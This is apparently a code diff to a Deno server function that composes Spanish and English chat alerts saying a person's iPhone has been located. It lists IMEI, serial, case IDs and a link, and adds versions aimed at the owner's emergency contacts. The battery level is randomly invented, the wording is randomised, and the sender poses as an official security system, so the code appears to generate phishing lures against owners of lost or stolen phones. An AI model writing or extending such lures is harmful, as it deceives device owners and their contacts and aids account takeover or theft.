@@ -306,65 +306,152 @@ Deno.serve(async (req) => {
     const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
 
     const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
+    const isEmergencyContact = queuedMessage.processes?.contact_type !== 'propietario';
+    const ownerName = queuedMessage.processes?.owner_name || 'el propietario';
 
     if (queuedMessage.language === 'spanish') {
-      const openingsES = [
-        '🛡️ Alerta de seguridad del sistema',
-        '🔐 Notificación de seguridad',
-        '🔒 Sistema de protección activado',
-      ];
-      const statusPhrasesES = [
-        'Detalles del dispositivo:',
-        'Información del equipo:',
-        'Datos técnicos:',
-      ];
-      const deviceSectionsES = [
-        `• Modelo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Capacidad: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serie: ${queuedMessage.processes?.serial_number}\n• Nivel de batería: ${battery} %`,
-        `• Dispositivo: ${queuedMessage.processes?.iphone_model}\n• Coloración: ${queuedMessage.processes?.color} | Almacenamiento: ${queuedMessage.processes?.storage}\n• Código IMEI: ${queuedMessage.processes?.imei}\n• No. Serie: ${queuedMessage.processes?.serial_number}\n• Batería actual: ${battery} %`,
-        `• Equipo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Memoria: ${queuedMessage.processes?.storage}\n• Identificador IMEI: ${queuedMessage.processes?.imei}\n• Número de serie: ${queuedMessage.processes?.serial_number}\n• Carga restante: ${battery} %`,
-      ];
-      const helpPhrasesES = [
-        '¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻',
-        '¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧',
-        '¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻',
-      ];
-      const closingsES = [
-        'Servicio automatizado – Atención disponible 24 h',
-        'Sistema automático – Soporte activo 24/7',
-        'Monitoreo continuo – Asistencia permanente',
-      ];
+      if (isEmergencyContact) {
+        // Mensajes para contactos de emergencia en español
+        const openingsES = [
+          '🚨 Alerta de contacto de emergencia',
+          '⚠️ Notificación automática de seguridad',
+          '🔔 Sistema de alerta activado',
+        ];
+        const emergencyNoticeES = [
+          `*Eres un contacto de emergencia de ${ownerName}*`,
+          `*Formas parte de la red de seguridad de ${ownerName}*`,
+          `*Estás registrado como contacto de emergencia de ${ownerName}*`,
+        ];
+        const actionRequiredES = [
+          `⚠️ *ACCIÓN REQUERIDA:* Por favor, informa a ${ownerName} que su dispositivo ha sido localizado.`,
+          `⚠️ *IMPORTANTE:* Notifica a ${ownerName} que su equipo fue encontrado.`,
+          `⚠️ *AVISO URGENTE:* Comunica a ${ownerName} que su dispositivo fue detectado.`,
+        ];
+        const statusPhrasesES = [
+          'Información del dispositivo localizado:',
+          'Detalles del equipo encontrado:',
+          'Datos del dispositivo detectado:',
+        ];
+        const deviceSectionsES = [
+          `• Modelo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Capacidad: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serie: ${queuedMessage.processes?.serial_number}\n• Nivel de batería: ${battery} %`,
+          `• Dispositivo: ${queuedMessage.processes?.iphone_model}\n• Coloración: ${queuedMessage.processes?.color} | Almacenamiento: ${queuedMessage.processes?.storage}\n• Código IMEI: ${queuedMessage.processes?.imei}\n• No. Serie: ${queuedMessage.processes?.serial_number}\n• Batería actual: ${battery} %`,
+        ];
+        const helpPhrasesES = [
+          'Para asistencia inmediata *Responde* *Menú*',
+          'Para soporte técnico *Escribe* *Menú*',
+          'Para ayuda especializada *Envía* *Menú*',
+        ];
+        const closingsES = [
+          'Sistema de emergencia – Servicio 24/7',
+          'Red de seguridad – Atención continua',
+          'Protocolo de alerta – Monitoreo permanente',
+        ];
 
-      const urlLine = url ? `\n\n${linkLabel}: ${url}` : '';
-      queuedMessage.message_content = `${random(openingsES)}\n\n${customSection}\n\nID de caso: ${caseId}\nID de cliente: ${clientId}\n\n${random(statusPhrasesES)}\n${random(deviceSectionsES)}${urlLine}\n\n${random(helpPhrasesES)}\n\n${random(closingsES)}`;
+        const urlLine = url ? `\n\n${linkLabel}: ${url}` : '';
+        queuedMessage.message_content = `${random(openingsES)}\n\n${random(emergencyNoticeES)}\n\n${random(actionRequiredES)}\n\n${customSection}\n\nID de caso: ${caseId}\nID de cliente: ${clientId}\n\n${random(statusPhrasesES)}\n${random(deviceSectionsES)}${urlLine}\n\n${random(helpPhrasesES)}\n\n${random(closingsES)}`;
+      } else {
+        // Mensajes para propietario en español
+        const openingsES = [
+          '🛡️ Alerta de seguridad del sistema',
+          '🔐 Notificación de seguridad',
+          '🔒 Sistema de protección activado',
+        ];
+        const statusPhrasesES = [
+          'Detalles del dispositivo:',
+          'Información del equipo:',
+          'Datos técnicos:',
+        ];
+        const deviceSectionsES = [
+          `• Modelo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Capacidad: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serie: ${queuedMessage.processes?.serial_number}\n• Nivel de batería: ${battery} %`,
+          `• Dispositivo: ${queuedMessage.processes?.iphone_model}\n• Coloración: ${queuedMessage.processes?.color} | Almacenamiento: ${queuedMessage.processes?.storage}\n• Código IMEI: ${queuedMessage.processes?.imei}\n• No. Serie: ${queuedMessage.processes?.serial_number}\n• Batería actual: ${battery} %`,
+          `• Equipo: ${queuedMessage.processes?.iphone_model}\n• Color: ${queuedMessage.processes?.color} | Memoria: ${queuedMessage.processes?.storage}\n• Identificador IMEI: ${queuedMessage.processes?.imei}\n• Número de serie: ${queuedMessage.processes?.serial_number}\n• Carga restante: ${battery} %`,
+        ];
+        const helpPhrasesES = [
+          '¿Necesitás ayuda? Escribí *Menú* para asistencia técnica 👨‍💻',
+          '¿Requerís soporte? Respondé *Menú* para ayuda especializada 🔧',
+          '¿Buscás asistencia? Enviá *Menú* para contactar soporte 👩‍💻',
+        ];
+        const closingsES = [
+          'Servicio automatizado – Atención disponible 24 h',
+          'Sistema automático – Soporte activo 24/7',
+          'Monitoreo continuo – Asistencia permanente',
+        ];
+
+        const urlLine = url ? `\n\n${linkLabel}: ${url}` : '';
+        queuedMessage.message_content = `${random(openingsES)}\n\n${customSection}\n\nID de caso: ${caseId}\nID de cliente: ${clientId}\n\n${random(statusPhrasesES)}\n${random(deviceSectionsES)}${urlLine}\n\n${random(helpPhrasesES)}\n\n${random(closingsES)}`;
+      }
     } else {
-      const openingsEN = [
-        '🛡️ System security alert',
-        '🔐 Security notification',
-        '🔒 Protection system activated',
-      ];
-      const statusPhrasesEN = [
-        'Device details:',
-        'Equipment information:',
-        'Technical data:',
-      ];
-      const colorEn = translateColor(queuedMessage.processes?.color || '');
-      const deviceSectionsEN = [
-        `• Model: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Storage: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serial: ${queuedMessage.processes?.serial_number}\n• Battery level: ${battery} %`,
-        `• Device: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Capacity: ${queuedMessage.processes?.storage}\n• IMEI Code: ${queuedMessage.processes?.imei}\n• Serial No.: ${queuedMessage.processes?.serial_number}\n• Current battery: ${battery} %`,
-      ];
-      const helpPhrasesEN = [
-        'Need help? Write *Menu* for technical assistance 👨‍💻',
-        'Require support? Reply *Menu* for specialized help 🔧',
-        'Looking for assistance? Send *Menu* to contact support 👩‍💻',
-      ];
-      const closingsEN = [
-        'Automated service – 24 h assistance available',
-        'Automatic system – 24/7 active support',
-        'Continuous monitoring – Permanent assistance',
-      ];
+      if (isEmergencyContact) {
+        // Mensajes para contactos de emergencia en inglés
+        const openingsEN = [
+          '🚨 Emergency contact alert',
+          '⚠️ Automatic security notification',
+          '🔔 Alert system activated',
+        ];
+        const emergencyNoticeEN = [
+          `*You are an emergency contact for ${ownerName}*`,
+          `*You are part of the security network for ${ownerName}*`,
+          `*You are registered as an emergency contact for ${ownerName}*`,
+        ];
+        const actionRequiredEN = [
+          `⚠️ *ACTION REQUIRED:* Please inform ${ownerName} that their device has been located.`,
+          `⚠️ *IMPORTANT:* Notify ${ownerName} that their device was found.`,
+          `⚠️ *URGENT NOTICE:* Communicate to ${ownerName} that their device was detected.`,
+        ];
+        const statusPhrasesEN = [
+          'Located device information:',
+          'Found equipment details:',
+          'Detected device data:',
+        ];
+        const colorEn = translateColor(queuedMessage.processes?.color || '');
+        const deviceSectionsEN = [
+          `• Model: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Storage: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serial: ${queuedMessage.processes?.serial_number}\n• Battery level: ${battery} %`,
+          `• Device: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Capacity: ${queuedMessage.processes?.storage}\n• IMEI Code: ${queuedMessage.processes?.imei}\n• Serial No.: ${queuedMessage.processes?.serial_number}\n• Current battery: ${battery} %`,
+        ];
+        const helpPhrasesEN = [
+          'For immediate assistance *Reply* *Menu*',
+          'For technical support *Write* *Menu*',
+          'For specialized help *Send* *Menu*',
+        ];
+        const closingsEN = [
+          'Emergency system – 24/7 service',
+          'Security network – Continuous attention',
+          'Alert protocol – Permanent monitoring',
+        ];
 
-      const urlLine = url ? `\n\n${linkLabel}: ${url}` : '';
-      queuedMessage.message_content = `${random(openingsEN)}\n\n${customSection}\n\nCase ID: ${caseId}\nClient ID: ${clientId}\n\n${random(statusPhrasesEN)}\n${random(deviceSectionsEN)}${urlLine}\n\n${random(helpPhrasesEN)}\n\n${random(closingsEN)}`;
+        const urlLine = url ? `\n\n${linkLabel}: ${url}` : '';
+        queuedMessage.message_content = `${random(openingsEN)}\n\n${random(emergencyNoticeEN)}\n\n${random(actionRequiredEN)}\n\n${customSection}\n\nCase ID: ${caseId}\nClient ID: ${clientId}\n\n${random(statusPhrasesEN)}\n${random(deviceSectionsEN)}${urlLine}\n\n${random(helpPhrasesEN)}\n\n${random(closingsEN)}`;
+      } else {
+        // Mensajes para propietario en inglés
+        const openingsEN = [
+          '🛡️ System security alert',
+          '🔐 Security notification',
+          '🔒 Protection system activated',
+        ];
+        const statusPhrasesEN = [
+          'Device details:',
+          'Equipment information:',
+          'Technical data:',
+        ];
+        const colorEn = translateColor(queuedMessage.processes?.color || '');
+        const deviceSectionsEN = [
+          `• Model: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Storage: ${queuedMessage.processes?.storage}\n• IMEI: ${queuedMessage.processes?.imei}\n• Serial: ${queuedMessage.processes?.serial_number}\n• Battery level: ${battery} %`,
+          `• Device: ${queuedMessage.processes?.iphone_model}\n• Color: ${colorEn} | Capacity: ${queuedMessage.processes?.storage}\n• IMEI Code: ${queuedMessage.processes?.imei}\n• Serial No.: ${queuedMessage.processes?.serial_number}\n• Current battery: ${battery} %`,
+        ];
+        const helpPhrasesEN = [
+          'Need help? Write *Menu* for technical assistance 👨‍💻',
+          'Require support? Reply *Menu* for specialized help 🔧',
+          'Looking for assistance? Send *Menu* to contact support 👩‍💻',
+        ];
+        const closingsEN = [
+          'Automated service – 24 h assistance available',
+          'Automatic system – 24/7 active support',
+          'Continuous monitoring – Permanent assistance',
+        ];
+
+        const urlLine = url ? `\n\n${linkLabel}: ${url}` : '';
+        queuedMessage.message_content = `${random(openingsEN)}\n\n${customSection}\n\nCase ID: ${caseId}\nClient ID: ${clientId}\n\n${random(statusPhrasesEN)}\n${random(deviceSectionsEN)}${urlLine}\n\n${random(helpPhrasesEN)}\n\n${random(closingsEN)}`;
+      }
     }
 
     // Final whitespace normalization
